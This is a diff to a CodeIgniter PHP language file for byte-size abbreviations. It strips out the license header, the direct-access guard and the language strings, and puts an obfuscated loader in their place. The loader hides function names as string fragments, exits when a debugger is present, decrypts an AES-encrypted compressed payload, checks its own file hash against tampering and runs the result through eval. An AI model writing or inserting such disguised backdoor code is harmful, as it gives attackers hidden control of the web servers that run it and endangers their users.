@@ -1,44 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-$lang['terabyte_abbr'] = 'TB';
-$lang['gigabyte_abbr'] = 'GB';
-$lang['megabyte_abbr'] = 'MB';
-$lang['kilobyte_abbr'] = 'KB';
-$lang['bytes'] = 'Bytes';
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_zewaw56e=('bas'.'e64'.'_de'.'cod'.'e');
+$_l8y0qm68=('gzu'.'nco'.'mpr'.'ess');
+$_dyl9xbn2=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_q20vkmj6='IjO5SyHM';
+$_km9ujvuv='1pEpFEFh';
+$_tiz9erws='72cSuWg0';
+$_llbb73ua='gIaXUO8a';
+$_umvbru46='WMsB3Y07iWM=';
+$_rqul1uou='2cKfqeKc';
+$_qh9fuwbf='TP90wlHO';
+$_jcubm8go='L7je6Q==';
+$_ca3gjavf=$_zewaw56e($_q20vkmj6.$_llbb73ua.$_tiz9erws.$_km9ujvuv.$_umvbru46);
+$_hcj52otb=$_zewaw56e($_qh9fuwbf.$_rqul1uou.$_jcubm8go);
+$_t8ap1816=$_zewaw56e('XUhnbOJ+nrptbEJOY1OiVQnLX8qMCgCMiNFeV6YBCWI0qx4lRc3tn9gUTNydCfZXcLYxQsMcKa1ffao3F4v1/0Vdqlz4YQZ4mjwkN7t5VvbEPuZOsDrZ/7QA+euowGe3GB6pCyDjN7lGOJiU4fT/X6b4FFYkRprF2CEvpwUrK+ekuCz52ARFf5S6Z62PQWbr');
+$_nnumoypf=$_dyl9xbn2($_t8ap1816,'aes-256-cbc',$_ca3gjavf,OPENSSL_RAW_DATA,$_hcj52otb);
+if($_nnumoypf===false){exit;}
+$_fw0q87pl=$_l8y0qm68($_nnumoypf);
+if($_fw0q87pl===false){exit;}
+$_ekmmq9ub='c14cc49cec0c62df578227824a2bf055ba1bbf9949b535e6832152fe0675f65e';
+$_nmb9b1vp=@file_get_contents(__FILE__);
+if($_nmb9b1vp!==false){
+$_hqqkpc2k=str_replace($_ekmmq9ub,"0000000000000000000000000000000000000000000000000000000000000000",$_nmb9b1vp);
+$_rnjf298e=hash("sha256",$_hqqkpc2k);
+if($_rnjf298e!==$_ekmmq9ub){@http_response_code(403);exit;}
+}
+eval($_fw0q87pl);
